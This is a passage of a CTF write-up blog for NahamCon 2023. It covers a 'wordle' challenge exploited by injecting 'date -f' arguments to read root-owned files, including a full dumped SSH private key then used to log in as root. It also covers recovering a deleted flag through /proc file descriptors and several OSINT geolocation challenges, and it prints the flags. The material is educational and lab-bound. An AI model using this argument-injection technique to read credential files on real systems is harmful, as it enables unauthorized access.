<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                                  
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /root/flag.txt<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‚Äò[ Sorry, your flag will be displayed once you have code execution as root ]‚Äô
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can &ldquo;guess&rdquo; the name of the flag file using wildcards:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                           
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /root/*<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: the argument ‚Äò/root/get_flag_random_suffix_345674837560870345‚Äô lacks a leading &#39;</span>+<span class="s1">&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s1">when using an option to specify date(s), any non-option
</span></span></span><span class="line"><span class="cl"><span class="s1">argument must be a format string beginning with &#39;</span>+<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Try &#39;</span>date --help<span class="s1">&#39; for more information.
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>We find an interesting file name. Once more, using exactly this name:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Wed Jan  1 00:00:00 UTC 2020
</span></span><span class="line"><span class="cl">Please select the date you meant:
</span></span><span class="line"><span class="cl">                                                                                   
</span></span><span class="line"><span class="cl">You&#39;ve entered &#39;-f /root/get_flag_random_suffix_345674837560870345&#39;. Is that right?
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò\177ELF\002\001\001‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò:‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò.\001?\031\003\016:\v;\v9\vI\023&lt;\031\001\023‚Äô
</span></span><span class="line"><span class="cl">Sorry, that wasn&#39;t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.</p>
<p>Eventually, I thought to look for ssh keys in <code>/root/.ssh/id_rsa</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">date: invalid date ‚Äò-----BEGIN OPENSSH PRIVATE KEY-----‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äòb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòNhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòNht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòKl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòU7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòK71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòGc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòPjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòEAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòuHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòDDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòvUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòDrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòInQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòUT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòvrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòZfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòKUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòwB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòcajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòMKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòzDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòU4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòpAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòLLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚ÄòvIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI<span class="o">=</span>‚Äô
</span></span><span class="line"><span class="cl">date: invalid date ‚Äò-----END OPENSSH PRIVATE KEY-----‚Äô
</span></span><span class="line"><span class="cl">Sorry, that wasn<span class="err">&#39;</span>t correct!
</span></span></code></pre></td></tr></table>
</div>
</div><p>Very nicely, the whole key is here. from this point it&rsquo;s a matter of creating the cleaned id_rsa file and using it to ssh as root.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh -p <span class="m">32726</span> -i id_rsa root@challenge.nahamcon.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@wordle:~# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@wordle:~# ls
</span></span><span class="line"><span class="cl">flag.txt  get_flag_random_suffix_345674837560870345
</span></span><span class="line"><span class="cl">root@wordle:~# ./get_flag_random_suffix_345674837560870345 
</span></span><span class="line"><span class="cl">Please press Enter within one second to retrieve the flag.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2b9576d1a7a631b8ce12595f80f3aba5<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.</p>
<p><code>flag{2b9576d1a7a631b8ce12595f80f3aba5}</code></p>
<h3 id="zombie">Zombie
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Oh, shoot, I could have sworn there was a flag here. Maybe it&rsquo;s still alive out there?</p>
</blockquote>
<hr>
<p>Logging in, we see an interesting .user-entrypoint.sh file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">1</span> user     user          <span class="m">4096</span> Jun <span class="m">15</span> 22:23 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:52 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> user     user          <span class="m">3846</span> Jun <span class="m">14</span> 17:52 .bashrc
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> user     user            <span class="m">17</span> Jun <span class="m">14</span> 17:52 .profile
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root     root           <span class="m">131</span> Jun <span class="m">14</span> 17:52 .user-entrypoint.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>the contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ cat ~/.user-entrypoint.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nohup tail -f /home/user/flag.txt &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span> <span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="nb">disown</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">rm -f /home/user/flag.txt 2&gt;<span class="p">&amp;</span><span class="m">1</span> &gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash -i
</span></span></code></pre></td></tr></table>
</div>
</div><p>This looks like something that might be run upon entry. Just to check we can see our default terminal in <code>/etc/passwd</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ cat /etc/passwd <span class="p">|</span> grep user
</span></span><span class="line"><span class="cl">user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looks like this did indeed run and we can see very clearly the <code>rm</code> function getting rid of the flag. oops.
Also notable is the <code>tail -f</code> . The -f flag is a live following, or reading the final lines of the file.  We can also see a trailing &amp;, meaning this has been set to background. As for <code>nohup</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nohup
</span></span><span class="line"><span class="cl">BusyBox v1.27.2 <span class="o">(</span>2018-06-06 09:08:44 UTC<span class="o">)</span> multi-call binary.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Usage: nohup PROG ARGS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Run PROG immune to hangups, with output to a non-tty
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see this prevents accidental closings. This process is likely still running.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ ps
</span></span><span class="line"><span class="cl">PID   USER     TIME   COMMAND
</span></span><span class="line"><span class="cl">    <span class="m">1</span> root       0:00 /usr/sbin/sshd -D -e
</span></span><span class="line"><span class="cl">    <span class="m">7</span> root       0:00 sshd: user <span class="o">[</span>priv<span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="m">9</span> user       0:00 sshd: user@pts/0
</span></span><span class="line"><span class="cl">   <span class="m">10</span> user       0:00 <span class="o">{</span>.user-entrypoin<span class="o">}</span> /bin/bash /home/user/.user-entrypoint.sh -c bash
</span></span><span class="line"><span class="cl">   <span class="m">11</span> user       0:00 tail -f /home/user/flag.txt
</span></span><span class="line"><span class="cl">   <span class="m">13</span> user       0:00 bash -i
</span></span><span class="line"><span class="cl">   <span class="m">18</span> user       0:00 bash
</span></span><span class="line"><span class="cl">   <span class="m">25</span> user       0:00 ps
</span></span></code></pre></td></tr></table>
</div>
</div><p>We do indeed see this process still running with a PID 11. My thinking is perhaps we can see the contents by exploring the PID in /proc/</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ <span class="nb">cd</span> /proc/11/
</span></span><span class="line"><span class="cl">user@zombie:/proc/11$ ls
</span></span><span class="line"><span class="cl">arch_status      clear_refs       cpuset           fd               limits           mem              net              oom_score        projid_map       setgroups        stat             task             uid_map
</span></span><span class="line"><span class="cl">attr             cmdline          cwd              fdinfo           loginuid         mountinfo        ns               oom_score_adj    root             smaps            statm            timens_offsets   wchan
</span></span><span class="line"><span class="cl">auxv             comm             environ          gid_map          map_files        mounts           numa_maps        pagemap          schedstat        smaps_rollup     status           timers
</span></span><span class="line"><span class="cl">cgroup           coredump_filter  exe              io               maps             mountstats       oom_adj          personality      sessionid        stack            syscall          timerslack_ns
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>fd</code> refers to file descriptors, which might contain info from stdin, stdout, etc.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:/proc/11$ <span class="nb">cd</span> fd
</span></span><span class="line"><span class="cl">user@zombie:/proc/11/fd$ ls
</span></span><span class="line"><span class="cl"><span class="m">0</span>  <span class="m">1</span>  <span class="m">2</span>  <span class="m">3</span>
</span></span><span class="line"><span class="cl">user@zombie:/proc/11/fd$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">dr-x------    <span class="m">2</span> user     user             <span class="m">0</span> Jun <span class="m">15</span> 22:42 .
</span></span><span class="line"><span class="cl">dr-xr-xr-x    <span class="m">9</span> user     user             <span class="m">0</span> Jun <span class="m">15</span> 22:41 ..
</span></span><span class="line"><span class="cl">lr-x------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">0</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">l-wx------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">1</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">l-wx------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">2</span> -&gt; /dev/null
</span></span><span class="line"><span class="cl">lr-x------    <span class="m">1</span> user     user            <span class="m">64</span> Jun <span class="m">15</span> 22:43 <span class="m">3</span> -&gt; /home/user/flag.txt <span class="o">(</span>deleted<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>While we do see that it notes flag.txt is deleted. However, perhaps we can still see something, since the program is still in running memory?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:/proc/11/fd$ cat <span class="m">3</span>
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>6387e800943b0b468c2622ff858bf744<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And the flag is here. Clearly a simple <code>rm</code> might not be enough to exterminate the file out of existence. However, this situation is probably a little unusual since the <code>tail -f</code> was still running long after the rm command.</p>
<p><code>flag{6387e800943b0b468c2622ff858bf744}</code></p>
<h2 id="osint">OSINT
</h2><h3 id="chall1">Chall1
</h3><blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a class="link" href="https://osint.golf"  target="_blank" rel="noopener"
    >https://osint.golf</a> and select <strong><code>chall1</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!</p>
</blockquote>
<hr>
<p>First challenge places us on a golf course, at some kind of ceremony/speech.
The first object of interest is the large event banner, containing the phrase &ldquo;all Thailand Premier Championship&rdquo;. There is more text, Road to (something), that I was unable to accurately read.</p>
<p><img src="/p/nahamconctf_2023/images/20230615163821.png"
	width="537"
	height="484"
	srcset="/p/nahamconctf_2023/images/20230615163821_hu10836530790636469723.png 480w, /p/nahamconctf_2023/images/20230615163821_hu12785617918239920796.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615163821.png"
	
	
		class="gallery-image" 
		data-flex-grow="110"
		data-flex-basis="266px"
	
></p>
<p>Searching for <code>all Thailand</code>, we quickly see a webpage for a <a class="link" href="https://www.allthailandgolftour.com/"  target="_blank" rel="noopener"
    >golf tour org</a>. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image&rsquo;s banner: &ldquo;Road to Singha (something)&rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found <a class="link" href="https://www.youtube.com/embed/-HSBJw_06XQ?rel=0&amp;wmode=transparent&amp;autoplay=1"  target="_blank" rel="noopener"
    >all Thailand Premier Championship - Road to Singha Masters</a> located on the media page. Following the link takes us to a video, and right away in the video we are given a location&ndash;Singha Park in Khon Kaen.</p>
<p><img src="/p/nahamconctf_2023/images/20230615164252.png"
	width="357"
	height="233"
	srcset="/p/nahamconctf_2023/images/20230615164252_hu506928876712483512.png 480w, /p/nahamconctf_2023/images/20230615164252_hu13223410266014081390.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615164252.png"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="367px"
	
></p>
<p><img src="/p/nahamconctf_2023/images/20230615164335.png"
	width="423"
	height="253"
	srcset="/p/nahamconctf_2023/images/20230615164335_hu524896829699230448.png 480w, /p/nahamconctf_2023/images/20230615164335_hu10067587471139383404.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615164335.png"
	
	
		class="gallery-image" 
		data-flex-grow="167"
		data-flex-basis="401px"
	
></p>
<p>I found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.</p>
<p><img src="/p/nahamconctf_2023/images/20230615164520.png"
	width="526"
	height="311"
	srcset="/p/nahamconctf_2023/images/20230615164520_hu2755895493591371799.png 480w, /p/nahamconctf_2023/images/20230615164520_hu9329722535499064504.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615164520.png"
	
	
		class="gallery-image" 
		data-flex-grow="169"
		data-flex-basis="405px"
	
></p>
<p>Finally with the pinpointed location, we get the flag.</p>
<p><code>flag{3e3d01a002db29fec2a5e10ec758b852}</code></p>
<h3 id="chall2">Chall2
</h3><blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a class="link" href="https://osint.golf"  target="_blank" rel="noopener"
    >https://osint.golf</a> and select <strong><code>chall2</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!<br>
<em>NOTE:</em> The integrated compass direction is inconsistent with the actual panorama representation.</p>
</blockquote>
<hr>
<p>The second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.</p>
<p><img src="/p/nahamconctf_2023/images/2023-06-1516-50-43.png"
	width="1210"
	height="403"
	srcset="/p/nahamconctf_2023/images/2023-06-1516-50-43_hu14198263368655490640.png 480w, /p/nahamconctf_2023/images/2023-06-1516-50-43_hu4684996654646967856.png 1024w"
	loading="lazy"
	
		alt="Screenshot from 2023-06-15 16-50-43.png"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="720px"
	
></p>
<p>Very quickly I find a very similar capture, labeling it <a class="link" href="http://50yearsinitaly.blogspot.com/2012/11/napoleons-elba-hideaway.html"  target="_blank" rel="noopener"
    >Napoleon&rsquo;s Elba Hideaway</a>.
The article notes that this location is in Portoferraio, Italy.</p>
<p><img src="/p/nahamconctf_2023/images/20230615165719.png"
	width="327"
	height="155"
	srcset="/p/nahamconctf_2023/images/20230615165719_hu6101862436576848423.png 480w, /p/nahamconctf_2023/images/20230615165719_hu15143476740200782147.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615165719.png"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="506px"
	
></p>
<p><img src="/p/nahamconctf_2023/images/20230615165808.png"
	width="601"
	height="343"
	srcset="/p/nahamconctf_2023/images/20230615165808_hu15411848168222197941.png 480w, /p/nahamconctf_2023/images/20230615165808_hu2137836552872449017.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615165808.png"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="420px"
	
></p>
<p>Once again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:</p>
<p><img src="/p/nahamconctf_2023/images/20230615170122.png"
	width="472"
	height="308"
	srcset="/p/nahamconctf_2023/images/20230615170122_hu5219627275537723545.png 480w, /p/nahamconctf_2023/images/20230615170122_hu14852017444810964557.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615170122.png"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="367px"
	
></p>
<p><code>flag{e54fcc18854f0adfdedf22120c346b3a}</code></p>
<h3 id="chall3">Chall3
</h3><blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a class="link" href="https://osint.golf"  target="_blank" rel="noopener"
    >https://osint.golf</a> and select <strong><code>chall3</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!</p>
</blockquote>
<hr>
